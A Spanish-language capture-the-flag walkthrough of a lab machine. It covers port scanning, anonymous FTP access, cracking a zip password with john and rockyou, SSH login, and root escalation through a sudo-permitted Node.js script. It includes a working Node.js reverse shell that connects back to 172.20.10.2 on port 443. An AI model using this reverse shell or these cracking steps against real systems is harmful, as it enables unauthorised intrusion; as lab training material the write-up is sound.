tags: 
____
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Pasted image 20251018142534.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,21 -vvv -oN version 172.17.0.2
```

![[Pasted image 20251018143414.png]]

Vemos dos cosas, por un lado un archivo que veremos más adelante, y por otro que el login anónimo está activado.
Vamos a acceder entonces con el usuario **anonymous** y la contraseña en blanco.

![[Anexos/Pasted image 20251018143931.png]]

Vemos ese archivo con el comando **ls**, así que nos lo descargamos con el comando **get**.

![[Pasted image 20251018144033.png]]

Vemos que en su interior hay un archivo password.txt pero necesitamos una contraseña. Vamos a intentar crackearla con john:

Primero extraemos su hash a un archivo llamado hash con el siguiente comando:

```bash
zip2john secretopicaron.zip > hash
```

![[Pasted image 20251018144434.png]]

Ahora intentamos crackear la contraseña con el diccionario **rockyou.txt**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![[Pasted image 20251018144604.png]]

La tenemos. Vamos a leer el archivo password.txt:

![[Pasted image 20251018144704.png]]

Vamos a conectarnos ahora por ssh:

![[Pasted image 20251018144817.png]]

Vemos que podemos ejecutar como root el archivo script.js en nuestro espacio de trabajo home. 
Node.js es sensible a una vulnerabilidad de escalada de privilegios con javascript si se ejecuta con permisos de root. Para logar una reverse shell del usuario root, vamos a modificar el script e insertar el siguiente código:

```java
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "172.20.10.2", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

![[Anexos/Pasted image 20251018151354.png]]

Lo ejecutamos:

```bash
sudo -u root /usr/bin/node /home/mario/script.js
```

![[Pasted image 20251018152257.png]]

Root!!